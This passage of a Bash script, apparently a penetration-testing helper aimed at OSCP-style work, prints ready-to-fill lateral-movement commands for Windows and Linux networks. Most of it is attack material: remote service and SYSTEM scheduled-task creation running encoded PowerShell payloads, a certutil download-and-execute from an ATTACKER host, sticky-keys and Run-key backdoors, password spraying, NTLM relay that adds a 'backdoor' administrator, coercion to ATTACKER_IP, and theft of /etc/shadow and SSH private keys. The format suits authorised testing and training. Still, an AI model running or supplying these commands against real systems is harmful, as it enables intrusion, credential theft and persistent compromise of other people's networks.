        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -x 'sc \\\\NEXT_TARGET create LatSvc binPath= \"cmd /c powershell -enc B64_PAYLOAD\" start= auto'  ${DIM}# create service${NC}"
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -x 'sc \\\\NEXT_TARGET start LatSvc'                        ${DIM}# start service${NC}"
        print_cmd "${atex} ${auth_p_next} 'powershell -enc B64_PAYLOAD'    ${DIM}# scheduled task exec (auto-cleanup)${NC}"
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -x 'schtasks /create /tn \"Updater\" /tr \"cmd /c powershell -enc B64\" /sc once /st 23:59 /ru SYSTEM'  ${DIM}# schtask as SYSTEM${NC}"

        lprint "    ${DIM}# ── B.7) SMB File Drop + Execute ────────────────────────────${NC}"
        print_note "Upload payload via SMB → execute remotely — good for AV-free custom tools"
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} --put-file /path/to/payload.exe C:\\\\Windows\\\\Temp\\\\payload.exe  ${DIM}# upload${NC}"
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -x 'C:\\Windows\\Temp\\payload.exe'                          ${DIM}# execute${NC}"
        print_cmd "smbclient -U '${dom_prefix}${user}%${cred}' //NEXT_TARGET/C\$  ${DIM}# interactive SMB shell to browse & upload${NC}"
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} --get-file 'C:\\Users\\Administrator\\Desktop\\flag.txt' flag.txt  ${DIM}# download file${NC}"

        lprint "    ${DIM}# ── B.8) WMI Remote Process Creation ────────────────────────${NC}"
        print_note "Port 135 | Process runs in Session 0 (invisible to user) | Often less monitored than SMB"
        print_cmd "${NXC_CMD} wmi NEXT_TARGET ${auth_h} -X 'whoami /all'           ${DIM}# WMI exec (single command)${NC}"
        print_cmd "${NXC_CMD} wmi NEXT_TARGET ${auth_h} -X 'powershell -enc B64'   ${DIM}# WMI exec PowerShell payload${NC}"
        print_cmd "${NXC_CMD} wmi NEXT_TARGET ${auth_h} -X 'cmd /c certutil -urlcache -split -f http://ATTACKER/shell.exe C:\\Temp\\shell.exe && C:\\Temp\\shell.exe'  ${DIM}# WMI download+exec${NC}"
        lprint "    ${DIM}# From compromised host PowerShell:${NC}"
        print_cmd "Invoke-WmiMethod -ComputerName NEXT_TARGET -Credential \$cred -Class Win32_Process -Name Create -ArgumentList 'cmd /c whoami > C:\\Temp\\out.txt'"

        lprint "    ${DIM}# ── B.9) DCOM Lateral Movement Variants ─────────────────────${NC}"
        print_note "Port 135 | Stealthier than PsExec — no binary upload, no service creation"
        print_note "Multiple COM objects: MMC20 (most common), ShellWindows, ShellBrowserWindow"
        print_cmd "${dex} ${auth_p_next} 'cmd.exe'                         ${DIM}# default DCOM (MMC20.Application)${NC}"
        print_cmd "${dex} -object MMC20 ${auth_p_next} 'cmd.exe'           ${DIM}# MMC20 object${NC}"
        print_cmd "${dex} -object ShellWindows ${auth_p_next} 'cmd.exe'    ${DIM}# ShellWindows object${NC}"
        print_cmd "${dex} -object ShellBrowserWindow ${auth_p_next} 'cmd.exe'  ${DIM}# ShellBrowserWindow object${NC}"
        lprint "    ${DIM}# From compromised host PowerShell:${NC}"
        print_cmd "\$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','NEXT_TARGET')); \$com.Document.ActiveView.ExecuteShellCommand('cmd','/c whoami > C:\\Temp\\out.txt',\$null,'7')"

        lprint "    ${DIM}# ── B.10) Remote Registry Abuse ─────────────────────────────${NC}"
        print_note "Sticky keys backdoor → RDP to target, press Shift 5x at lock screen = SYSTEM cmd"
        print_note "Run key persistence → payload auto-runs on every user login"
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -x 'reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"cmd.exe\" /f'  ${DIM}# sticky keys backdoor${NC}"
        print_cmd "$(impacket_cmd reg) ${auth_p_next} query -keyName 'HKLM\\SAM\\SAM\\Domains\\Account\\Users'  ${DIM}# remote registry read${NC}"
        print_cmd "$(impacket_cmd reg) ${auth_p_next} add -keyName 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -v Updater -vt REG_SZ -vd 'C:\\Temp\\payload.exe'  ${DIM}# persistence via Run key${NC}"

    # ── [C] NON-ADMIN LATERAL MOVEMENT — valid creds, no exec ─────────────
    else
        lprint "    ${BOLD}${YELLOW}┌─ [C] Non-Admin Lateral Movement ${DIM}(valid creds, no local admin) ─${NC}"
        print_note "Creds work but no exec access here → spray to find where you ARE admin"
        print_note "Also: Kerberoast for new creds, relay attacks, ACL abuse, RBCD"

        lprint "    ${DIM}# ── C.1) Credential Re-use Spray — find where you ARE admin ─${NC}"
        print_note "Same creds might give admin on OTHER hosts — spray everything"
        print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h}                      ${DIM}# spray subnet — look for (Pwn3d!) on other hosts${NC}"
        print_cmd "${NXC_CMD} winrm SUBNET/24 ${auth_h}                    ${DIM}# WinRM spray — user might be in Remote Mgmt Users elsewhere${NC}"
        print_cmd "${NXC_CMD} rdp SUBNET/24 ${auth_h}                      ${DIM}# RDP spray — check RDP access across subnet${NC}"
        print_cmd "${NXC_CMD} mssql SUBNET/24 ${auth_h}                    ${DIM}# MSSQL spray — find SQL servers accepting these creds${NC}"
        print_cmd "${NXC_CMD} ssh SUBNET/24 ${auth_h}                      ${DIM}# SSH spray — Linux boxes with same password${NC}"
        print_cmd "${NXC_CMD} wmi SUBNET/24 ${auth_h}                      ${DIM}# WMI spray — sometimes works when SMB exec doesn't${NC}"
        [[ "$LOCAL_AUTH" == "false" ]] && \
            print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} --local-auth     ${DIM}# try as local account on each host${NC}"

        lprint "    ${DIM}# ── C.2) Share Enumeration — find sensitive files on other hosts${NC}"
        print_note "Spider shares across subnet — look for passwords, configs, scripts, private keys"
        print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} --shares             ${DIM}# readable shares across subnet${NC}"
        print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} -M spider_plus -o READ_ONLY=true EXCLUDE_EXTS=exe,dll  ${DIM}# spider all reachable shares${NC}"
        print_cmd "smbclient -L //NEXT_TARGET/ -U '${dom_prefix}${user}%${cred}'  ${DIM}# list shares interactively${NC}"
        print_cmd "smbclient //NEXT_TARGET/SHARENAME -U '${dom_prefix}${user}%${cred}'  ${DIM}# connect to specific share${NC}"
        print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} -M gpp_password      ${DIM}# GPP plaintext passwords in SYSVOL${NC}"

        lprint "    ${DIM}# ── C.3) Password Spraying — find more valid accounts ───────${NC}"
        print_note "ALWAYS check lockout policy first! Spray carefully within threshold"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --pass-pol               ${DIM}# CHECK LOCKOUT POLICY FIRST!${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --users                  ${DIM}# enumerate all domain users${NC}"
        print_cmd "${NXC_CMD} smb ${ip} -u users.txt -p '${cred}' --continue-on-success  ${DIM}# spray same password${NC}"
        [[ "$use_hash" == "1" ]] && \
            print_cmd "${NXC_CMD} smb ${ip} -u users.txt -H ${hash_val} --continue-on-success  ${DIM}# spray hash${NC}"

        lprint "    ${DIM}# ── C.4) Kerberoast → Crack → Move ─────────────────────────${NC}"
        print_note "Request TGS for service accounts → crack offline → use new creds to move laterally"
        print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --kerberoasting kerberoast.txt  ${DIM}# request SPN hashes${NC}"
        print_cmd "hashcat -m 13100 kerberoast.txt rockyou.txt             ${DIM}# crack → get new creds${NC}"
        print_tip "Cracked service account may be admin on other hosts → re-spray with new creds"

        lprint "    ${DIM}# ── C.5) NTLM Relay — leverage valid session ────────────────${NC}"
        print_note "Coerce auth from a machine → relay to another target → get exec/ACL abuse"
        print_note "Find relay targets: hosts without SMB signing (--gen-relay-list)"
        print_cmd "${NXC_CMD} smb SUBNET/24 --gen-relay-list relay_targets.txt  ${DIM}# hosts without SMB signing${NC}"
        print_cmd "$(impacket_cmd ntlmrelayx) -tf relay_targets.txt -smb2support  ${DIM}# relay captured auth${NC}"
        print_cmd "$(impacket_cmd ntlmrelayx) -tf relay_targets.txt -smb2support -i  ${DIM}# relay → interactive SMB shell${NC}"
        print_cmd "$(impacket_cmd ntlmrelayx) -tf relay_targets.txt -smb2support -c 'net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add'  ${DIM}# relay → add admin${NC}"
        lprint "    ${DIM}# Coerce authentication from target:${NC}"
        print_cmd "$(impacket_cmd PetitPotam) ATTACKER_IP NEXT_TARGET ${auth_p}  ${DIM}# EFS coerce${NC}"
        print_cmd "$(impacket_cmd printerbug) ${auth_p} ATTACKER_IP           ${DIM}# PrinterBug/SpoolSample coerce${NC}"
        print_cmd "$(impacket_cmd dfscoerce) -d ${domain:-DOMAIN} -u '${user}' -p '${cred}' ATTACKER_IP NEXT_TARGET  ${DIM}# DFSCoerce${NC}"

        lprint "    ${DIM}# ── C.6) ACL Abuse — if BloodHound shows a path ─────────────${NC}"
        print_note "Check BloodHound for: GenericAll, ForceChangePassword, WriteDACL, AddMember"
        print_note "These let you modify AD objects even without admin access"
        print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M daclread -o TARGET=TARGET_USER  ${DIM}# check your rights on target object${NC}"
        lprint "    ${DIM}# GenericAll / GenericWrite on user:${NC}"
        if [[ "$use_hash" == "1" ]]; then
            print_cmd "$(impacket_cmd dacledit) -hashes :${hash_val} -target-dn 'TARGET_DN' -action write -ace-type full-control '${dom_prefix}${user}'@${ip}"
        else
            print_cmd "$(impacket_cmd dacledit) -target-dn 'TARGET_DN' -action write -ace-type full-control '${dom_prefix}${user}':'${cred}'@${ip}"
        fi
        lprint "    ${DIM}# ForceChangePassword:${NC}"
        print_cmd "net rpc password TARGET_USER 'NewP@ss123' -U '${dom_prefix}${user}%${cred}' -S ${ip}"
        lprint "    ${DIM}# AddMember (add self to privileged group):${NC}"
        print_cmd "net rpc group addmem 'Domain Admins' '${user}' -U '${dom_prefix}${user}%${cred}' -S ${ip}"
        lprint "    ${DIM}# WriteOwner / WriteDACL:${NC}"
        print_cmd "$(impacket_cmd owneredit) ${auth_p} -target TARGET_USER -new-owner '${user}'"
        print_cmd "$(impacket_cmd dacledit) ${auth_p} -target TARGET_USER -action write -ace-type full-control"

        lprint "    ${DIM}# ── C.7) RBCD Attack (no admin needed, MAQ > 0) ─────────────${NC}"
        print_note "Create machine account → set delegation → impersonate admin on target"
        print_note "Prereq: MachineAccountQuota > 0 + GenericAll/Write on target computer"
        print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M MAQ                  ${DIM}# check MachineAccountQuota${NC}"
        print_cmd "$(impacket_cmd addcomputer) ${auth_p} -computer-name 'EVIL\$' -computer-pass 'Evil1234'"
        print_cmd "$(impacket_cmd rbcd) ${auth_p} -action write -delegate-to 'TARGET\$' -delegate-from 'EVIL\$'"
        print_cmd "$(impacket_cmd getST) ${auth_p} -spn cifs/TARGET.${domain:-DOMAIN} -impersonate Administrator"
        print_cmd "export KRB5CCNAME=Administrator@cifs_TARGET.${domain:-DOMAIN}@${domain:-DOMAIN}.ccache"
        print_cmd "$(impacket_cmd psexec) -k -no-pass TARGET.${domain:-DOMAIN}  ${DIM}# SYSTEM shell via S4U2Proxy${NC}"

        lprint "    ${DIM}# ── C.8) Shadow Credentials (if ADCS + writeable target) ────${NC}"
        print_note "Add shadow credential to target → auth as that computer → extract hashes"
        print_note "Prereq: ADCS enabled + GenericWrite on target computer object"
        if tool_exists certipy-ad || tool_exists certipy; then
            local cb="certipy-ad"; tool_exists certipy && cb="certipy"
            if [[ "$use_hash" == "1" ]]; then
                print_cmd "${cb} shadow auto -u '${user}@${domain:-DOMAIN}' -hashes :${hash_val} -account TARGET_USER"
            else
                print_cmd "${cb} shadow auto -u '${user}@${domain:-DOMAIN}' -p '${cred}' -account TARGET_USER"
            fi
            print_tip "Requires GenericWrite / GenericAll on target + ADCS enrolled"
        else
            print_cmd "python3 pywhisker.py -d ${domain:-DOMAIN} -u '${user}' -p '${cred}' -t TARGET_USER --action add"
            print_tip "pip install certipy-ad for Shadow Credentials attack"
        fi
    fi

    # ── [D] TOOL-SPECIFIC LATERAL MOVEMENT — based on what worked ─────────
    lprint "    ${BOLD}${MAG}┌─ [D] Protocol-Specific Lateral Movement (${tool} succeeded) ──${NC}"
    print_note "These commands are tailored to the protocol that worked — use the same method on other targets"
    case "$tool" in
        winrm|winrm-ssl)
            lprint "    ${DIM}# ── WinRM Pivoting ─────────────────────────────────────────${NC}"
            if [[ "$use_hash" == "1" ]]; then
                print_cmd "${WINRM_CMD} -i NEXT_TARGET -u '${user}' -H ${hash_val}  ${DIM}# evil-winrm to next host${NC}"
            else
                print_cmd "${WINRM_CMD} -i NEXT_TARGET -u '${user}' -p '${cred}'    ${DIM}# evil-winrm to next host${NC}"
            fi
            print_cmd "${NXC_CMD} winrm SUBNET/24 ${auth_h}                        ${DIM}# spray WinRM across subnet${NC}"
            lprint "    ${DIM}# From evil-winrm session (in-session pivoting):${NC}"
            print_cmd "Invoke-Command -ComputerName NEXT_TARGET -ScriptBlock {whoami}   ${DIM}# PS remoting to next host${NC}"
            print_cmd "\$s = New-PSSession -ComputerName NEXT_TARGET; Enter-PSSession \$s  ${DIM}# interactive PS session${NC}"
            print_cmd "Invoke-Command -ComputerName (Get-ADComputer -Filter *).Name -ScriptBlock {hostname}  ${DIM}# fan-out to ALL domain computers${NC}"
            print_cmd "upload /path/to/SharpHound.exe C:\\Temp\\SharpHound.exe          ${DIM}# evil-winrm upload for collection${NC}"
            print_cmd "upload /path/to/ligolo-agent.exe C:\\Temp\\agent.exe             ${DIM}# upload pivot agent${NC}" ;;

        psexec|smbexec|atexec)
            lprint "    ${DIM}# ── SMB-Based Pivoting ─────────────────────────────────────${NC}"
            local wex sex pex dex atex
            wex=$(impacket_cmd wmiexec); sex=$(impacket_cmd smbexec)
            pex=$(impacket_cmd psexec);  dex=$(impacket_cmd dcomexec)
            atex=$(impacket_cmd atexec)
            print_cmd "${pex} ${auth_p_next}                               ${DIM}# PsExec → SYSTEM shell on next target${NC}"
            print_cmd "${sex} ${auth_p_next}                               ${DIM}# SMBexec → stealthier variant${NC}"
            print_cmd "${wex} ${auth_p_next}                               ${DIM}# WMIexec → semi-interactive, less logs${NC}"
            print_cmd "${dex} ${auth_p_next} 'cmd.exe'                     ${DIM}# DCOM → alternative execution method${NC}"
            print_cmd "${atex} ${auth_p_next} 'whoami'                     ${DIM}# ATExec → scheduled task single cmd${NC}"
            print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} -x 'whoami'     ${DIM}# mass exec across whole subnet${NC}"
            print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} -X 'hostname'   ${DIM}# PowerShell exec across subnet${NC}"
            print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} --exec-method smbexec -x 'whoami'  ${DIM}# force smbexec method${NC}"
            print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} --exec-method atexec -x 'whoami'   ${DIM}# force atexec method${NC}"
            print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} --exec-method mmcexec -x 'whoami'  ${DIM}# force DCOM/MMC method${NC}" ;;

        wmi)
            lprint "    ${DIM}# ── WMI-Based Pivoting ─────────────────────────────────────${NC}"
            print_cmd "${NXC_CMD} wmi SUBNET/24 ${auth_h} -X 'whoami'     ${DIM}# WMI mass exec across subnet${NC}"
            print_cmd "${NXC_CMD} wmi NEXT_TARGET ${auth_h} -X 'powershell -enc B64_PAYLOAD'  ${DIM}# WMI exec on specific target${NC}"
            if [[ "$is_admin" == "true" ]]; then
                local wex; wex=$(impacket_cmd wmiexec)
                print_cmd "${wex} ${auth_p_next}                           ${DIM}# impacket WMIexec interactive shell${NC}"
            fi
            lprint "    ${DIM}# WMI process creation (from compromised host):${NC}"
            print_cmd "wmic /node:NEXT_TARGET /user:'${dom_prefix}${user}' /password:'${cred}' process call create 'cmd /c whoami > C:\\Temp\\out.txt'"
            print_cmd "Invoke-WmiMethod -ComputerName NEXT_TARGET -Class Win32_Process -Name Create -ArgumentList 'powershell -enc B64'" ;;

        ssh)
            lprint "    ${DIM}# ── SSH Pivoting ───────────────────────────────────────────${NC}"
            print_cmd "ssh '${user}'@NEXT_TARGET                            ${DIM}# direct SSH to next Linux host${NC}"
            print_cmd "${NXC_CMD} ssh SUBNET/24 ${auth_h} -x 'id'          ${DIM}# spray SSH across subnet${NC}"
            print_cmd "${NXC_CMD} ssh SUBNET/24 ${auth_h} -x 'cat /etc/shadow 2>/dev/null || cat /etc/passwd'  ${DIM}# harvest creds from all hosts${NC}"
            lprint "    ${DIM}# SSH tunneling for network pivot:${NC}"
            print_cmd "ssh -D 1080 -N '${user}'@${ip}                     ${DIM}# SOCKS5 dynamic proxy (proxychains)${NC}"
            print_cmd "ssh -L 445:INTERNAL_HOST:445 '${user}'@${ip}       ${DIM}# forward SMB through SSH tunnel${NC}"
            print_cmd "ssh -L 5985:INTERNAL_HOST:5985 '${user}'@${ip}     ${DIM}# forward WinRM through SSH tunnel${NC}"
            print_cmd "ssh -L 3389:INTERNAL_HOST:3389 '${user}'@${ip}     ${DIM}# forward RDP through SSH tunnel${NC}"
            print_cmd "ssh -R 9001:127.0.0.1:9001 '${user}'@${ip}         ${DIM}# expose attacker listener on target${NC}"
            print_cmd "ssh -J '${user}'@${ip} '${user}'@NEXT_TARGET       ${DIM}# ProxyJump multi-hop${NC}"
            lprint "    ${DIM}# Credential harvesting from Linux host:${NC}"
            print_cmd "${NXC_CMD} ssh ${ip} ${auth_h} -x 'find / -name id_rsa -o -name id_ed25519 -o -name *.pem 2>/dev/null'  ${DIM}# find SSH keys${NC}"
            print_cmd "${NXC_CMD} ssh ${ip} ${auth_h} -x 'cat /home/*/.ssh/id_rsa 2>/dev/null'  ${DIM}# steal SSH private keys${NC}"
            print_cmd "${NXC_CMD} ssh ${ip} ${auth_h} -x 'cat /home/*/.bash_history 2>/dev/null | grep -i pass'  ${DIM}# grep history for passwords${NC}"
            print_cmd "${NXC_CMD} ssh ${ip} ${auth_h} -x 'grep -rli password /home/*/.*config* /etc/*.conf 2>/dev/null'  ${DIM}# find config files with passwords${NC}"
            print_cmd "${NXC_CMD} ssh ${ip} ${auth_h} -x 'ip route; ip neigh; arp -a 2>/dev/null'  ${DIM}# discover connected networks${NC}"
            if [[ "$LINUX_MODE" == "true" ]]; then
                lprint "    ${DIM}# Linux-specific credential reuse:${NC}"
                print_cmd "${NXC_CMD} ssh SUBNET/24 -u root -p '${cred}'    ${DIM}# try same password as root everywhere${NC}"
                print_cmd "for key in /tmp/stolen_keys/*; do ssh -i \$key '${user}'@NEXT_TARGET; done  ${DIM}# try stolen SSH keys${NC}"
            fi ;;

        mssql)
            lprint "    ${DIM}# ── MSSQL Pivoting ─────────────────────────────────────────${NC}"
            print_cmd "${NXC_CMD} mssql SUBNET/24 ${auth_h}                ${DIM}# spray MSSQL across subnet${NC}"
            print_cmd "$(impacket_cmd mssqlclient) ${auth_p} -windows-auth ${DIM}# interactive MSSQL client${NC}"
            lprint "    ${DIM}# From mssqlclient interactive session:${NC}"
            print_cmd "enable_xp_cmdshell"
            print_cmd "xp_cmdshell whoami /all"
            lprint "    ${DIM}# MSSQL Linked Servers — pivot to other SQL instances:${NC}"
            print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1\"  ${DIM}# find linked servers${NC}"
            print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"EXEC ('whoami') AT [LINKED_SERVER]\"  ${DIM}# exec on linked server${NC}"
            print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"EXEC ('EXEC (''whoami'') AT [LINKED_SERVER_2]') AT [LINKED_SERVER_1]\"  ${DIM}# double-hop linked server${NC}"
            print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"EXEC ('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER]\"  ${DIM}# enable xp_cmdshell on linked${NC}"
            lprint "    ${DIM}# MSSQL UNC Path Injection (steal NTLMv2 hash):${NC}"
            print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"EXEC xp_dirtree '\\\\\\\\ATTACKER_IP\\\\share'\"  ${DIM}# trigger NTLM auth to your responder${NC}"
            print_cmd "$(impacket_cmd responder) -I eth0 -v  ${DIM}# capture NTLMv2 hash on attacker${NC}"
            lprint "    ${DIM}# MSSQL impersonation (if mssql_priv module found paths):${NC}"
            print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -M mssql_priv     ${DIM}# check impersonation + trustworthy privesc paths${NC}"
            print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'\"  ${DIM}# impersonate sa${NC}"
            print_warn "DISABLE xp_cmdshell when done: exec sp_configure 'xp_cmdshell',0; RECONFIGURE" ;;

        rdp)
            lprint "    ${DIM}# ── RDP Pivoting ───────────────────────────────────────────${NC}"
            if [[ "$use_hash" == "1" ]]; then
                print_cmd "${XFREERDP_CMD} /v:NEXT_TARGET /u:'${user}' /pth:${hash_val} ${XFREERDP_CERT} /dynamic-resolution +clipboard  ${DIM}# PTH RDP to next host${NC}"
            else
                print_cmd "${XFREERDP_CMD} /v:NEXT_TARGET /u:'${user}' /p:'${cred}' ${XFREERDP_CERT} /dynamic-resolution +clipboard  ${DIM}# RDP to next host${NC}"
            fi
            print_cmd "${NXC_CMD} rdp SUBNET/24 ${auth_h}                  ${DIM}# spray RDP across subnet${NC}"
            print_cmd "${NXC_CMD} rdp SUBNET/24 ${auth_h} --screenshot --screentime 5  ${DIM}# screenshot all RDP-accessible hosts${NC}"
            lprint "    ${DIM}# From RDP session (in-GUI lateral movement):${NC}"
            print_cmd "mstsc /v:NEXT_TARGET                                 ${DIM}# open RDP client from within RDP session${NC}"
            print_cmd "cmdkey /add:NEXT_TARGET /user:'${dom_prefix}${user}' /pass:'${cred}' && mstsc /v:NEXT_TARGET  ${DIM}# save creds + connect${NC}"
            lprint "    ${DIM}# Enable RDP on targets (if admin via other protocol):${NC}"
            print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -M rdp -o ACTION=enable  ${DIM}# enable RDP service${NC}"
            print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -x 'net localgroup \"Remote Desktop Users\" ${user} /add'  ${DIM}# add user to RDP group${NC}"
            lprint "    ${DIM}# Restricted Admin / RemoteCredentialGuard (PTH over RDP):${NC}"
            print_cmd "${XFREERDP_CMD} /v:NEXT_TARGET /u:'${user}' /pth:${hash_val:-HASH} ${XFREERDP_CERT} /restricted-admin  ${DIM}# Restricted Admin mode${NC}"
            print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -x 'reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'  ${DIM}# enable Restricted Admin${NC}" ;;
    esac

    # ── [E] KERBEROS-BASED LATERAL MOVEMENT ───────────────────────────────
    if [[ -n "$domain" ]]; then
        lprint "    ${BOLD}${BLUE}┌─ [E] Kerberos-Based Lateral Movement ──────────────────────${NC}"
        print_note "Use Kerberos tickets instead of passwords/hashes — works even when NTLM is disabled"
        print_note "CRITICAL: Always use HOSTNAME not IP! IP forces NTLM = ticket ignored"
        lprint "    ${DIM}# ── Pass-the-Ticket → any host ──────────────────────────────${NC}"
        if [[ "$use_hash" == "1" ]]; then
            print_cmd "$(impacket_cmd getTGT) '${dom_prefix}${user}' -hashes :${hash_val}  ${DIM}# get TGT${NC}"
        else
            print_cmd "$(impacket_cmd getTGT) '${dom_prefix}${user}':'${cred}'              ${DIM}# get TGT${NC}"
        fi
        print_cmd "export KRB5CCNAME=\$(ls *.ccache | head -1)"
        print_cmd "$(impacket_cmd psexec) -k -no-pass NEXT_TARGET.${domain}    ${DIM}# PtT → SYSTEM shell on any domain host${NC}"
        print_cmd "$(impacket_cmd wmiexec) -k -no-pass NEXT_TARGET.${domain}   ${DIM}# PtT → WMI shell${NC}"
        print_cmd "$(impacket_cmd smbexec) -k -no-pass NEXT_TARGET.${domain}   ${DIM}# PtT → SMBexec shell${NC}"
        print_cmd "$(impacket_cmd smbclient) -k -no-pass NEXT_TARGET.${domain}  ${DIM}# PtT → SMB share access${NC}"
        print_cmd "${WINRM_CMD} -i NEXT_TARGET.${domain} -r ${domain} --no-pass -k  ${DIM}# PtT → WinRM${NC}"
        lprint "    ${DIM}# ── Overpass-the-Hash (OPTH) — convert NT hash to Kerberos ─${NC}"
        if [[ "$use_hash" == "1" ]]; then
            print_cmd "$(impacket_cmd getTGT) '${dom_prefix}${user}' -hashes :${hash_val} -dc-ip ${ip}  ${DIM}# NT hash → TGT${NC}"
        fi
        print_cmd "$(impacket_cmd ticketConverter) ticket.kirbi ticket.ccache  ${DIM}# convert .kirbi ↔ .ccache${NC}"
        lprint "    ${DIM}# ── S4U2Self / S4U2Proxy — impersonate any user ─────────────${NC}"
        print_cmd "$(impacket_cmd getST) ${auth_p} -spn cifs/NEXT_TARGET.${domain} -impersonate Administrator  ${DIM}# get service ticket as Admin${NC}"
        print_cmd "export KRB5CCNAME=Administrator@cifs_NEXT_TARGET.${domain}@${domain}.ccache"
        print_cmd "$(impacket_cmd psexec) -k -no-pass NEXT_TARGET.${domain}  ${DIM}# use impersonated ticket${NC}"
    fi

    # ── [F] NTLM RELAY LATERAL MOVEMENT ───────────────────────────────────
    lprint "    ${BOLD}${RED}┌─ [F] NTLM Relay / Coercion Lateral Movement ────────────────${NC}"
    print_note "Coerce a machine to authenticate to you → relay that auth to another target"
    print_note "Requires: relay targets without SMB signing (use --gen-relay-list to find them)"
    print_cmd "${NXC_CMD} smb SUBNET/24 --gen-relay-list relay_targets.txt  ${DIM}# find hosts without SMB signing${NC}"
    print_cmd "$(impacket_cmd ntlmrelayx) -tf relay_targets.txt -smb2support  ${DIM}# start relay server${NC}"
    print_cmd "$(impacket_cmd ntlmrelayx) -tf relay_targets.txt -smb2support -i  ${DIM}# relay → interactive SMB shell${NC}"
    print_cmd "$(impacket_cmd ntlmrelayx) -tf relay_targets.txt -smb2support -e payload.exe  ${DIM}# relay → exec payload${NC}"
    print_cmd "$(impacket_cmd ntlmrelayx) -tf relay_targets.txt -smb2support --shadow-credentials  ${DIM}# relay → shadow creds (ADCS)${NC}"
    print_cmd "$(impacket_cmd ntlmrelayx) -tf relay_targets.txt -smb2support --delegate-access  ${DIM}# relay → RBCD${NC}"
    print_cmd "$(impacket_cmd ntlmrelayx) -t ldap://${ip} --escalate-user '${user}' --delegate-access  ${DIM}# LDAP relay → privesc${NC}"
    print_cmd "$(impacket_cmd ntlmrelayx) -t ldap://${ip} --add-computer RELAY01 'P@ss123'  ${DIM}# relay → add machine account${NC}"
    lprint "    ${DIM}# Trigger coercion from target machine:${NC}"
    if [[ -n "$domain" ]]; then
        print_cmd "$(impacket_cmd PetitPotam) ATTACKER_IP NEXT_TARGET       ${DIM}# EFS coercion (unauthenticated on old DCs)${NC}"
        print_cmd "$(impacket_cmd PetitPotam) -u '${user}' -p '${cred}' -d ${domain} ATTACKER_IP NEXT_TARGET  ${DIM}# authenticated EFS${NC}"
        print_cmd "$(impacket_cmd printerbug) '${dom_prefix}${user}':'${cred}'@NEXT_TARGET ATTACKER_IP  ${DIM}# PrinterBug/SpoolSample${NC}"
        print_cmd "$(impacket_cmd dfscoerce) -d ${domain} -u '${user}' -p '${cred}' ATTACKER_IP NEXT_TARGET  ${DIM}# DFSCoerce${NC}"
    fi

    # ── Pivoting / Tunneling ──────────────────────────────────────────────
    lprint "${BOLD}  [${step}] Pivoting / Tunneling${NC}"; ((step++))
    print_note "Need to reach internal networks from Kali? Set up a tunnel through the compromised host"
    print_note "Ligolo-ng = easiest | Chisel = reliable fallback | SSH = if SSH access available"
    lprint "    ${DIM}# ── Ligolo-ng (recommended for OSCP) ─────────────────────────${NC}"
    print_cmd "  ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601               ${DIM}# attacker: start proxy${NC}"
    print_cmd "  ./agent -connect ATTACKER_IP:11601 -ignore-cert             ${DIM}# target: connect back${NC}"
    print_cmd "  sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up"
    print_cmd "  sudo ip route add 192.168.X.0/24 dev ligolo                 ${DIM}# route target subnet${NC}"
    lprint "    ${DIM}# ── Chisel ────────────────────────────────────────────────────${NC}"
    print_cmd "  ./chisel server -p 8080 --reverse                           ${DIM}# attacker${NC}"
    print_cmd "  ./chisel client ATTACKER_IP:8080 R:socks                    ${DIM}# target → SOCKS5 on 127.0.0.1:1080${NC}"
    print_cmd "  proxychains ${NXC_CMD} smb TARGET_SUBNET/24 ${auth_h}      ${DIM}# pivot through socks${NC}"
    lprint "    ${DIM}# ── SSH Tunneling ─────────────────────────────────────────────${NC}"
    print_cmd "  ssh -D 1080 -N '${user}'@${ip}                             ${DIM}# SOCKS5 dynamic proxy${NC}"
    print_cmd "  ssh -L 445:INTERNAL_HOST:445 '${user}'@${ip}               ${DIM}# port forward (for impacket)${NC}"
    print_cmd "  ssh -R 9001:127.0.0.1:9001 '${user}'@${ip}                 ${DIM}# expose attacker listener on target${NC}"
